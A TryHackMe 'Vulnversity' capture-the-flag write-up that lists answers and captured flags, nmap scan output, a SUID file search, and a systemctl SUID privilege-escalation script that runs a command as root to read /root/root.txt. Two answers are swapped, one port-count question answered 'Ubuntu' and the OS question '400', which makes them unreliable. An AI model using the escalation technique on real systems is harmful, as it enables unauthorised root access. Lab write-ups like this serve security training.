# TryhackMe - Vulnversity [10.10.118.91]
## TASK1 - Deploy the machine
## TASK2 - Reconnaissance
+ There are many Nmap "cheatsheets" online that you can use too.`No Answer Needed`
+ Scan the box; how many ports are open?`6`
    ```bash
    hengkisirait: task4 $ nmap -sV 10.10.118.91
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-28 08:51 WIB
    Nmap scan report for 10.10.118.91
    Host is up (0.36s latency).
    Not shown: 994 closed tcp ports (conn-refused)
    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         vsftpd 3.0.3
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    3128/tcp open  http-proxy  Squid http proxy 3.5.12
    3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
    Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 115.06 seconds
    ```
+ What version of the squid proxy is running on the machine?`3.5.12`
+ How many ports will Nmap scan if the flag -p-400 was used?`Ubuntu`
+ What is the most likely operating system this machine is running?`400`
+ What port is the web server running on?`3333`
+ What is the flag for enabling verbose mode using Nmap?`-v`

## Task 3  Locating directories using Gobuster
+ What is the directory that has an upload form page?`/internal/`

## Task 4  Compromise the Webserver

+ What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.`.php`
+ Run this attack, what extension is allowed?`.phtml`
+ What is the name of the user who manages the webserver?`bill`
+ What is the user flag?`8bd7992fbe8a6ad22a63361004cfcedb`

## Task 5  Privilege Escalation
+ On the system, search for all SUID files. Which file stands out?`/bin/systemctl`
    ```bash
    find / -user root -perm -4000 -exec ls -ldb {} \;
    -rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
    -rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
    -rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
    -rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
    -rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
    -rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
    -rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
    -rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
    -rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
    -rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
    -rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
    -rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
    -rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    -rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    -rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
    -rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
    -rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
    -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
    -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
    -rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
    -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
    -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
    -rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
    ```
+ Become root and get the last flag (/root/root.txt)`a58ff8579f0a9270368d33a9966c7fd5`
    ```bash
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "cat /root/root.txt >> /tmp/flag"
    [Install]
    WantedBy=multi-user.target' > $TF
    systemctl link $TF
    systemctl enable --now $TF
    ```


